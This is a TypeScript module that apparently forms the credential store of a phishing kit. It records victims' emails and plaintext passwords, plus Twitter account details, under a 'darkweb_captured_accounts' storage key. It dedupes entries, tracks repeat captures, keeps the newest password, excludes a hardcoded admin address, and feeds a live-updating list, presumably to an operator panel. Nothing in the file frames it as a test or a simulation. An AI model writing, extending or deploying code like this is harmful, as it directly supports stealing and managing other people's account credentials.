import type { AuthMethod, CapturedCredential } from './types';
import { lsGet, lsJsonGet, lsSet } from './safeStorage';

export const CAPTURED_STORAGE_KEY = 'darkweb_captured_accounts_v3';
export const CAPTURED_EVENT = 'darkweb-captured-updated';
export const ADMIN_EMAIL = 'admin1234@gmail.com';

function rid(): string {
  return `cap_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 10)}`;
}

export function isAdminCredential(email: string): boolean {
  return String(email || '').trim().toLowerCase() === ADMIN_EMAIL.toLowerCase();
}

function sanitize(list: unknown[]): CapturedCredential[] {
  const out: CapturedCredential[] = [];
  const seen = new Set<string>();

  for (const item of list) {
    if (!item || typeof item !== 'object') continue;
    const r = item as Record<string, unknown>;
    const email = String(r.email || '').trim();
    const password = String(r.password ?? '');
    if (!email) continue;
    if (isAdminCredential(email)) continue;

    const type: AuthMethod = r.type === 'twitter' ? 'twitter' : 'email';
    const dedupeKey = `${type}|${email.toLowerCase()}`;

    if (seen.has(dedupeKey)) {
      const idx = out.findIndex(
        (c) => c.type === type && c.email.toLowerCase() === email.toLowerCase()
      );
      if (idx >= 0) {
        const prev = out[idx];
        const newer =
          Number(r.lastSeenAt || r.createdAt || 0) >=
          (prev.lastSeenAt || prev.createdAt || 0);
        out[idx] = {
          ...prev,
          password: newer ? password : prev.password,
          username: (r.username ? String(r.username) : undefined) || prev.username,
          name: (r.name ? String(r.name) : undefined) || prev.name,
          avatar: (r.avatar ? String(r.avatar) : undefined) || prev.avatar,
          lastSeenAt: Math.max(
            prev.lastSeenAt || 0,
            Number(r.lastSeenAt || 0) || Date.now()
          ),
          count: Math.max(prev.count || 1, Number(r.count || 1) || 1),
        };
      }
      continue;
    }
    seen.add(dedupeKey);

    out.push({
      id: typeof r.id === 'string' ? r.id : rid(),
      type,
      email,
      password,
      username: r.username ? String(r.username) : undefined,
      name: r.name ? String(r.name) : undefined,
      avatar: r.avatar ? String(r.avatar) : undefined,
      avatarMediaId: r.avatarMediaId ? String(r.avatarMediaId) : undefined,
      userId: r.userId ? String(r.userId) : undefined,
      seq: typeof r.seq === 'number' ? r.seq : out.length + 1,
      createdAt: typeof r.createdAt === 'number' ? r.createdAt : Date.now(),
      lastSeenAt: typeof r.lastSeenAt === 'number' ? r.lastSeenAt : Date.now(),
      count: typeof r.count === 'number' ? r.count : 1,
    });
  }

  return out
    .sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0))
    .map((c, i) => ({ ...c, seq: i + 1 }));
}

export function readCaptured(): CapturedCredential[] {
  try {
    const raw = lsGet(CAPTURED_STORAGE_KEY);
    if (!raw) return [];
    const parsed = JSON.parse(raw);
    if (!Array.isArray(parsed)) return [];
    return sanitize(parsed);
  } catch {
    return [];
  }
}

export function writeCaptured(list: CapturedCredential[]): void {
  try {
    const cleaned = sanitize(list);
    lsSet(CAPTURED_STORAGE_KEY, JSON.stringify(cleaned));
    if (typeof window !== 'undefined') {
      try {
        window.dispatchEvent(new CustomEvent(CAPTURED_EVENT, { detail: cleaned }));
      } catch {
        /* ignore */
      }
    }
  } catch {
    /* ignore */
  }
}

export type CaptureInput = {
  type: AuthMethod;
  email: string;
  password: string;
  username?: string;
  name?: string;
  avatar?: string;
  avatarMediaId?: string;
  userId?: string;
};

export function captureNow(input: CaptureInput): CapturedCredential[] {
  try {
    const email = String(input.email || '').trim();
    const password = String(input.password ?? '');
    if (!email) return readCaptured();
    if (isAdminCredential(email)) return readCaptured();

    const type: AuthMethod = input.type === 'twitter' ? 'twitter' : 'email';
    const current = readCaptured();
    const key = email.toLowerCase();
    const existing = current.find(
      (c) => c.email.toLowerCase() === key && c.type === type
    );

    let next: CapturedCredential[];
    if (existing) {
      next = current.map((c) =>
        c.id === existing.id
          ? {
              ...c,
              password,
              username: input.username?.trim() || c.username,
              name:
                input.name?.trim() ||
                c.name ||
                (type === 'twitter' ? 'Twitter User' : 'Email User'),
              avatar: input.avatar || c.avatar,
              avatarMediaId: input.avatarMediaId || c.avatarMediaId,
              userId: input.userId || c.userId,
              lastSeenAt: Date.now(),
              count: (c.count || 1) + 1,
            }
          : c
      );
    } else {
      const row: CapturedCredential = {
        id: rid(),
        type,
        email,
        password,
        username: input.username?.trim() || undefined,
        name:
          input.name?.trim() ||
          (type === 'twitter' ? 'Twitter User' : 'Email User'),
        avatar: input.avatar,
        avatarMediaId: input.avatarMediaId,
        userId: input.userId,
        seq: 1,
        createdAt: Date.now(),
        lastSeenAt: Date.now(),
        count: 1,
      };
      next = [row, ...current];
    }

    writeCaptured(next);
    return readCaptured();
  } catch {
    return [];
  }
}

export function updateCaptured(
  id: string,
  patch: Partial<CapturedCredential>
): CapturedCredential[] {
  try {
    const next = readCaptured()
      .map((c) => (c.id === id ? { ...c, ...patch, id: c.id } : c))
      .filter((c) => !isAdminCredential(c.email));
    writeCaptured(next);
    return readCaptured();
  } catch {
    return [];
  }
}

export function clearAllCaptured(): CapturedCredential[] {
  writeCaptured([]);
  return [];
}

export function getInitials(email: string, name?: string): string {
  if (name && name !== 'Email User' && name !== 'Twitter User') {
    const parts = name.trim().split(/\s+/);
    if (parts.length >= 2) return (parts[0][0] + parts[1][0]).toUpperCase();
    return name.slice(0, 2).toUpperCase();
  }
  const local = email.split('@')[0] || 'EM';
  return local.slice(0, 2).toUpperCase();
}

export function subscribeCaptured(
  cb: (list: CapturedCredential[]) => void
): () => void {
  if (typeof window === 'undefined') return () => undefined;

  const fire = () => {
    try {
      cb(readCaptured());
    } catch {
      cb([]);
    }
  };
  const onStorage = (e: StorageEvent) => {
    if (e.key === CAPTURED_STORAGE_KEY || e.key === null) fire();
  };

  try {
    window.addEventListener(CAPTURED_EVENT, fire as EventListener);
    window.addEventListener('storage', onStorage);
  } catch {
    /* ignore */
  }
  const iv = window.setInterval(fire, 1200);

  return () => {
    try {
      window.removeEventListener(CAPTURED_EVENT, fire as EventListener);
      window.removeEventListener('storage', onStorage);
    } catch {
      /* ignore */
    }
    window.clearInterval(iv);
  };
}

// silence unused import warning path
void lsJsonGet;
